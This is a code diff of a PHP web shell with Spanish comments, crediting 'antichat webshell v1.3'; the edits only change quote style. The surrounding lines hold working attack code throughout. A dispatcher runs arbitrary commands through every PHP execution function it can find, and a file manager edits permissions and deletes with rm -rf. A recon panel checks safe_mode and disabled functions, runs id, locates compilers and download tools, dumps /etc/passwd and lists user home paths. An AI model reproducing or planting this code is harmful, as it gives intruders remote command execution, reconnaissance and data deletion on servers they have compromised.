-        elseif (shell_exec("echo a")){$salida[]=shell_exec($cmd); $salida[]='Modo: shell_exec($cmd)';}
+        elseif (shell_exec('echo a')){$salida[]=shell_exec($cmd); $salida[]='Modo: shell_exec($cmd)';}
         
-        elseif (exec("echo a")){$salida[]=exec($cmd); $salida[]='Modo: exec($cmd)';}
+        elseif (exec('echo a')){$salida[]=exec($cmd); $salida[]='Modo: exec($cmd)';}
         
-        elseif (systemreturn("echo a")){$salida[]=systemreturn($cmd); $salida[]='Modo: system($cmd)';}
+        elseif (systemreturn('echo a')){$salida[]=systemreturn($cmd); $salida[]='Modo: system($cmd)';}
         
-        elseif (passthrureturn("echo a")){$salida[]=passthrureturn($cmd); $salida[]='Modo: passthru($cmd)';}
+        elseif (passthrureturn('echo a')){$salida[]=passthrureturn($cmd); $salida[]='Modo: passthru($cmd)';}
        
-        elseif (shellprocopen("echo a")){$salida[]=shellprocopen($cmd); $salida[]='Modo: proc_open($cmd)';}
+        elseif (shellprocopen('echo a')){$salida[]=shellprocopen($cmd); $salida[]='Modo: proc_open($cmd)';}
        
-        elseif (shellpcntl("echo a")){$salida[]=shellpcntl($cmd); $salida[]='Modo: pcntl_exec($cmd)';}
+        elseif (shellpcntl('echo a')){$salida[]=shellpcntl($cmd); $salida[]='Modo: pcntl_exec($cmd)';}
         
         if ($array){
             return $salida;
@@ -1445,13 +1445,13 @@ function shell($cmd, $array = true){
 }
 function shellpopen($cmd){
 /* fuente: antichat webshell v1.3 */
-  if($fp = popen($cmd,"r")){ 
-    $result = "";
+  if($fp = popen($cmd,'r')){ 
+    $result = '';
     while(!feof($fp)){$result.=fread($fp,1024);}
     pclose($fp);
   
     $ret = $result;
-    $ret = convert_cyr_string($ret,"d","w");
+    $ret = convert_cyr_string($ret,'d','w');
     return $ret;
   }else{
     return false;
@@ -1475,9 +1475,9 @@ function passthrureturn($cmd){
 }
 function shellprocopen($cmd){
     $descriptorspec = array(
-       0 => array("pipe", "r"), 
-       1 => array("pipe", "w"), 
-       2 => array("pipe", "w") 
+       0 => array('pipe', 'r'), 
+       1 => array('pipe', 'w'), 
+       2 => array('pipe', 'w') 
     );
    
     $process = proc_open($cmd, $descriptorspec, $pipes);
@@ -1510,7 +1510,7 @@ function shellpcntl($cmd){
 //muestra los archivos del manejador de archivos
 function mostrarlink($ruta,$archivo,$eslink=FALSE){
 global $rfiurl;
-    if ($ruta){$barra="/";}else{$barra="";}
+    if ($ruta){$barra='/';}else{$barra='';}
 
     //$celdaeditar es la primer columna
     if(is_link($ruta.$barra.$archivo)){         //Cuando son links
@@ -1532,15 +1532,15 @@ global $rfiurl;
     if (!$eslink){      //cuando son links no se pone esto
         $perm = permisos($ruta.$barra.$archivo);
         if (is_writable($ruta.$barra.$archivo)){
-            $colorpermisos = "#8ABD22";
+            $colorpermisos = '#8ABD22';
         }else{
-            $colorpermisos = "#CD2626";
+            $colorpermisos = '#CD2626';
         }
         
         $data = posix_getpwuid(fileowner($ruta.$barra.$archivo));
-        $usuario = $data["name"];
+        $usuario = $data['name'];
         $data = posix_getgrgid(filegroup($ruta.$barra.$archivo));
-        $usuario.= ':'.$data["name"];
+        $usuario.= ':'.$data['name'];
         $salida= '<tr>'.$celdaeditar.'<td style="text-align:left;">'.$salida.'</td><td style="text-align:center;">'.$filesize.'</td><td style="text-align:center;">'.htmlentities($usuario,ENT_QUOTES,'UTF-8') .'</td><td style="text-align:right; color:'.$colorpermisos.'"><a href="'.$rfiurl.'w=chmod&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.$perm.'</a></td><td style="text-align:right;">'.date("d/m/Y H:i",filectime($ruta.$barra.$archivo)).'</td></tr>'."\n";
     }
     return $salida;
@@ -1606,17 +1606,17 @@ function formatBytes($b,$p = null) {
      * result automatically.
      *
      **/
-    $units = array("B","kB","MB","GB","TB","PB","EB","ZB","YB");
+    $units = array('B','kB','MB','GB','TB','PB','EB','ZB','YB');
     $c=0;
     if(!$p && $p !== 0) {
         foreach($units as $k => $u) {
             if(($b / pow(1024,$k)) >= 1) {
-                $r["bytes"] = $b / pow(1024,$k);
-                $r["units"] = $u;
+                $r['bytes'] = $b / pow(1024,$k);
+                $r['units'] = $u;
                 $c++;
             }
         }
-        return number_format($r["bytes"],2) . " " . $r["units"];
+        return number_format($r['bytes'],2) . ' ' . $r['units'];
     } else {
         return number_format($b / pow(1024,$p)) . " " . $units[$p];
     }
@@ -1650,7 +1650,7 @@ function leerarchivo($ruta){
     return $salida;
 }
 function leerarchivofopen($ruta){
-    if(!$handle = fopen($ruta, "r")){
+    if(!$handle = fopen($ruta, 'r')){
         return FALSE;
     }
     while (!feof($handle)) {
@@ -1697,12 +1697,12 @@ function decodeSize( $bytes )
 //borra un archivo o carpeta
 function borrar($carpeta){
     if (is_file($carpeta)){
-        return unlink($carpeta) or shell("rm -rf ".escapeshellarg($carpeta), FALSE);
+        return unlink($carpeta) or shell('rm -rf '.escapeshellarg($carpeta), FALSE);
     }else{
-        foreach(glob($carpeta."/*") as $archivos_carpeta){
+        foreach(glob($carpeta.'/*') as $archivos_carpeta){
             borrar($archivos_carpeta);
         }
-        return rmdir($carpeta) or shell("rm -rf ".escapeshellarg($carpeta), FALSE);
+        return rmdir($carpeta) or shell('rm -rf '.escapeshellarg($carpeta), FALSE);
     }
 }
 
@@ -1742,8 +1742,8 @@ function mostrararchivo($ruta,$loc = true){
                 echo '<div class="s">'.htmlentities($ruta, ENT_QUOTES, 'UTF-8').':</div><textarea style="width:100%;" rows="'.$lineas.'">'.$contenido.'</textarea><br><br>';
             }elseif ($loc and ($loc!="''")){
                 //usamos locate para encontrar mas archivos con ese nombre
-                echo $ruta."<br>";
-                $locate = shell("locate ".escapeshellarg(basename($ruta)), false);
+                echo $ruta.'<br>';
+                $locate = shell('locate '.escapeshellarg(basename($ruta)), false);
                 $locate = explode("\n",$locate);
                 if($locate){
                     foreach($locate as $ubicacion){
@@ -1763,8 +1763,8 @@ function archivosdeusuarios($ruta){
     $salida = "";
         foreach ($usuarios as $usuario){
             $nombreusuario = substr($usuario,0,strpos($usuario,":"));
-            if ($nombreusuario and ($nombreusuario!= "root")){
-                $salida.="/home/".$nombreusuario.$ruta."\n";
+            if ($nombreusuario and ($nombreusuario!= 'root')){
+                $salida.='/home/'.$nombreusuario.$ruta."\n";
             }
         }
     return $salida;
@@ -1774,10 +1774,10 @@ function archivosdeusuarios($ruta){
 function mostrarinformacion(){
     $ruta = getcwd() or '/';
     
-    if((!ini_get("safe_mode")) or (strtolower(ini_get("safe_mode"))=="off")){
-        $safemode = "No";
+    if((!ini_get('safe_mode')) or (strtolower(ini_get('safe_mode'))=='off')){
+        $safemode = 'No';
     }else{
-        $safemode = "Si";
+        $safemode = 'Si';
     } 
     
     $salida = '<b>'.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'</b><br><br>
@@ -1785,20 +1785,20 @@ function mostrarinformacion(){
     <b>PHP:</b> '.htmlentities(phpversion(), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>Zend:</b> '.htmlentities(zend_version(), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>Safe_mode:</b> '.$safemode.'<br><br>
-    <b>Funciones desactivadas:</b> '.htmlentities(ini_get("disable_functions"), ENT_QUOTES, 'UTF-8').'<br><br>
-    <b>Open basedir:</b> '.htmlentities(ini_get("open_basedir"), ENT_QUOTES, 'UTF-8').'<br><br>
+    <b>Funciones desactivadas:</b> '.htmlentities(ini_get('disable_functions'), ENT_QUOTES, 'UTF-8').'<br><br>
+    <b>Open basedir:</b> '.htmlentities(ini_get('open_basedir'), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>'.htmlentities(php_uname(), ENT_QUOTES, 'UTF-8').'</b><br><br>';
-    if($id = shell("id",false)){
+    if($id = shell('id',false)){
         $salida.= '<b>'.htmlentities($id, ENT_QUOTES, 'UTF-8').'</b><br><br>
-        '.htmlentities(shell("whereis gcc",false), ENT_QUOTES, 'UTF-8').'<br><br>
-        '.htmlentities(shell("whereis perl",false), ENT_QUOTES, 'UTF-8').'<br><br>
-        '.htmlentities(shell("whereis python",false), ENT_QUOTES, 'UTF-8').'<br><br>
-        '.htmlentities(shell("whereis curl",false), ENT_QUOTES, 'UTF-8').'<br><br>
-        '.htmlentities(shell("whereis wget",false), ENT_QUOTES, 'UTF-8').'<br><br>
+        '.htmlentities(shell('whereis gcc',false), ENT_QUOTES, 'UTF-8').'<br><br>
+        '.htmlentities(shell('whereis perl',false), ENT_QUOTES, 'UTF-8').'<br><br>
+        '.htmlentities(shell('whereis python',false), ENT_QUOTES, 'UTF-8').'<br><br>
+        '.htmlentities(shell('whereis curl',false), ENT_QUOTES, 'UTF-8').'<br><br>
+        '.htmlentities(shell('whereis wget',false), ENT_QUOTES, 'UTF-8').'<br><br>
         <br>
         ';
     }
-    if($usuarios = leerarchivo("/etc/passwd")){
+    if($usuarios = leerarchivo('/etc/passwd')){
         $salida.= '<b>/etc/passwd:</b><br>
             <textarea style="width:100%;" rows="10">'.$usuarios.'</textarea><br><br>';
     }
